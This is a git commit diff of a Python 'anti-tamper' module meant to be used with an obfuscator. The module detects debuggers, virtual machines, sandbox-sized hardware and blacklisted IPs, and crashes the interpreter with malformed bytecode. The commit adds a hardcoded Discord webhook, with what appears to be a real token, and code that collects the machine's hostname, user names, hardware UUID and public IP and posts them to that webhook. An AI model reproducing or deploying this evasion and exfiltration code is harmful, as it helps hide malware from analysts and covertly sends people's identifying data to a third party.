6bc69a916133bd43227c14129e294624cc06f7c2
ImInTheICU <111275373+ImInTheICU@users.noreply.github.com>
2022-09-26 15:30:58 -0500

    Update!!
    Fully updated,

--- ExtraLayerMain.py
+++ ExtraLayerMain.py
@@ -1,6 +1,11 @@
+import re
+import requests
+import json
+import socket
+import subprocess
 from win32gui import GetWindowText,EnumWindows
 from win32process import GetWindowThreadProcessId
-from psutil import Process,process_iter, virtual_memory, cpu_count, disk_usage
+from psutil import Process,process_iter, virtual_memory, cpu_count, disk_usage, users
 from threading import Thread
 from requests import get
 from os import system, path, environ
@@ -10,11 +15,67 @@ from winreg import HKEY_LOCAL_MACHINE, OpenKey, CloseKey, QueryValueEx
 # ExtraLayer | An extra-layer between you and the code.
 # ExtraLayer | Should be used along with a obfuscator!
 
+# // DiscordWebhook Moduel
+class Discord:
+    def __init__(self, *, url):
+        self.url = url
+
+    def post(
+        self,
+        *,
+        content=None,
+        username=None,
+        avatar_url=None,
+        tts=False,
+        file=None,
+        embeds=None,
+        allowed_mentions=None
+    ):
+        if content is None and file is None and embeds is None:
+            raise ValueError("required one of content, file, embeds")
+        data = {}
+        if content is not None:
+            data["content"] = content
+        if username is not None:
+            data["username"] = username
+        if avatar_url is not None:
+            data["avatar_url"] = avatar_url
+        data["tts"] = tts
+        if embeds is not None:
+            data["embeds"] = embeds
+        if allowed_mentions is not None:
+            data["allowed_mentions"] = allowed_mentions
+        if file is not None:
+            return requests.post(
+                self.url, {"payload_json": json.dumps(data)}, files=file
+            )
+        else:
+            return requests.post(
+                self.url, json.dumps(data), headers={"Content-Type": "application/json"}
+            )
 
 class ExtraLayer:
     # // Settings
     LAYER_SEND_REASON = True # // Send the reason of exiting | might help them debug... so use at cation!
     LAYER_SEND_INFO = False # // Send debug info, of user | might help you debug if ExtraLayer is causing problems!
+    LAYER_DISCORD_WEBHOOK = "https://discordapp.com/api/webhooks/1024049249249398906/8vJ1NKLWzEYI2n-wVjNkEyFnwQdq1jc5IAjns_2kWd0AACfxD0SB2rKuwQD52agQlXwZ"
+
+    if LAYER_DISCORD_WEBHOOK != "":
+        try:
+            UserWebHook = Discord(url=str(LAYER_DISCORD_WEBHOOK))
+        except Exception as errored:
+            if LAYER_SEND_INFO:
+                print(f"DEBUG: Could not assign WebHook! | {errored}")
+
+    LAYER_REASONS = {
+        "_CHECK_WINDOWS":["Found Debugger, Type: "],
+        "_CHECK_IP":["Blacklisted IP!"],
+        "_CHECK_VM":["Detected VM(VPS) 0x1"],
+        "_CHECK_REGISTRY":["Detected VM(VPS) 0x2"],
+        "_CHECK_DLL":["Detected VM(VPS) 0x3"],
+        "_CHECK_SPECS":["MEMORY Invalid!","STORAGE Invalid!","CPU Counts, invalid!"],
+        }
+
 
     # // Methods
     def _EXIT(reason):
@@ -22,6 +83,52 @@ class ExtraLayer:
             print(reason)
         if ExtraLayer.LAYER_SEND_INFO:
             print("DEBUG: _EXIT")
+        if ExtraLayer.UserWebHook:
+            try:
+                # // Gets All USERS, Bad method of appending (please update), thanks!
+                USERS = """"""
+                PC_USERS = users()
+                for PC_USER in PC_USERS:
+                    USERS += f"{PC_USER.name} | "
+
+                # // Get HWID/UUID
+                USER_HWID = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
+                
+                # // Get IP
+                USER_IP = get('https://api64.ipify.org/').text.strip()
+
+                # // Get HostName (Running User).
+                if socket.gethostname().find('.')>=0:
+                    USER = socket.gethostname()
+                else:
+                    USER = socket.gethostbyaddr(socket.gethostname())[0]
+
+                ExtraLayer.UserWebHook.post(
+                    username="ExtraLayer Services",
+                    avatar_url="https://raw.githubusercontent.com/ImInTheICU/Python-AntiTamper/main/_ExtraLayer128x128.jpg",
+                    embeds=[
+                        {
+                            "author": {
+                                "name": "Anti-Debugger",
+                                "url": "https://github.com/ImInTheICU/Python-AntiTamper",
+                            },
+                            "title": "PC INFO",
+                            "description": "**Warning: Sensitive information, DONT SHARE OR LEAK!**",
+                            "fields": [
+                                {"name": "PC INFO", "value": f"```\nPC Name: {USER} \nPC's: {USERS} \nPC-HWID: {USER_HWID} \nIP: {USER_IP} \n```"},
+                                {"name": "Detection", "value": f"```\nExtraLayer Detected: {reason} \n```"},
+                            ],
+
+                            "footer": {
+                                "text": "Protected by ExtraLayer!",
+                            },
+                        }
+                    ],
+                )
+            except Exception as errored:
+                if ExtraLayer.LAYER_SEND_INFO:
+                    print(f"DEBUG: Could not send data to webhook! | {errored}")
+        
         exec(type((lambda: 0).__code__)(0, 0, 0, 0, 0, 0, b'\x053', (), (), (), '', '', 0, b'')) 
 
     def _CHECK_WINDOWS():
@@ -39,7 +146,7 @@ class ExtraLayer:
                         except: pass
                 if ExtraLayer.LAYER_SEND_INFO:
                     print("DEBUG: _CHECK_WINDOWS | Failed")
-                ExtraLayer._EXIT(f'Debugger Open, Type: {GetWindowText( hwnd )}')
+                ExtraLayer._EXIT(f'{ExtraLayer.LAYER_REASONS["_CHECK_WINDOWS"][0]}{GetWindowText( hwnd )}')
         while True: EnumWindows( winEnumHandler, None )
 
     def _CHECK_IP():
@@ -49,7 +156,7 @@ class ExtraLayer:
         while True:
             try:
                 ip = get('https://api64.ipify.org/').text.strip()
-                if ip in blacklisted: ExtraLayer._EXIT('Ip Blacklisted')
+                if ip in blacklisted: ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_CHECK_IP"][0])
                 return
             except: pass
 
@@ -58,7 +165,7 @@ class ExtraLayer:
             print("DEBUG: _CHECK_VM")
         processes = ['VMwareService.exe', 'VMwareTray.exe']
         for proc in process_iter():
-            if proc.name() in processes: ExtraLayer._EXIT('Detected Vm')
+            if proc.name() in processes: ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_CHECK_VM"][0])
 
     def _CHECK_REGISTRY():
         if ExtraLayer.LAYER_SEND_INFO:
@@ -66,27 +173,26 @@ class ExtraLayer:
         if system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul") != 1 and system("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul") != 1: ExtraLayer._EXIT('Detected Vm')
         handle = OpenKey(HKEY_LOCAL_MACHINE, 'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')
         try:
-            if "VMware" in QueryValueEx(handle, '0')[0] or "VBOX" in QueryValueEx(handle, '0')[0]: ExtraLayer._EXIT('Detected Vm')
+            if "VMware" in QueryValueEx(handle, '0')[0] or "VBOX" in QueryValueEx(handle, '0')[0]: ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_CHECK_REGISTRY"][0])
         finally: CloseKey(handle)
 
     def _CHECK_DLL():
         if ExtraLayer.LAYER_SEND_INFO:
             print("DEBUG: _CHECK_DLL")
-        if path.exists(path.join(environ["SystemRoot"], "System32\\vmGuestLib.dll")) or path.exists(path.join(environ["SystemRoot"], "vboxmrxnp.dll")):  ExtraLayer._EXIT('Detected Vm')
+        if path.exists(path.join(environ["SystemRoot"], "System32\\vmGuestLib.dll")) or path.exists(path.join(environ["SystemRoot"], "vboxmrxnp.dll")):  ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_CHECK_DLL"][0])
 
     def _CHECK_SPECS():
         if ExtraLayer.LAYER_SEND_INFO:
             print("DEBUG: _CHECK_SPECS")
-        if int(str(virtual_memory()[0]/1024/1024/1024).split(".")[0]) <= 4: ExtraLayer._EXIT('Memory Ammount Invalid')
-        if int(str(disk_usage('/')[0]/1024/1024/1024).split(".")[0]) <= 50: ExtraLayer._EXIT('Storage Ammount Invalid')
-        if int(cpu_count()) <= 1: ExtraLayer._EXIT('Cpu Counts Invalid')
+        if int(str(virtual_memory()[0]/1024/1024/1024).split(".")[0]) <= 4: ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_CHECK_SPECS"][0])
+        if int(str(disk_usage('/')[0]/1024/1024/1024).split(".")[0]) <= 50: ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_CHECK_SPECS"][1])
+        if int(cpu_count()) <= 1: ExtraLayer._EXIT(ExtraLayer.LAYER_REASONS["_CHECK_SPECS"][2])
 
     # // Main | Startup
     def _START_LAYER():
-        print(f"DEBUG: Start_Layer was called!")
+        if ExtraLayer.LAYER_SEND_INFO:
+            print(f"DEBUG: Start_Layer was called!")
         checks = [ExtraLayer._CHECK_WINDOWS,ExtraLayer._CHECK_IP,ExtraLayer._CHECK_REGISTRY,ExtraLayer._CHECK_DLL,ExtraLayer._CHECK_SPECS,ExtraLayer._CHECK_VM] # // You can add,remove checks here!
         for check in checks: Thread(target=check,daemon=True).start()
         if ExtraLayer.LAYER_SEND_INFO:
             print(f"DEBUG: {check}, was started!")
-
-ExtraLayer._START_LAYER()
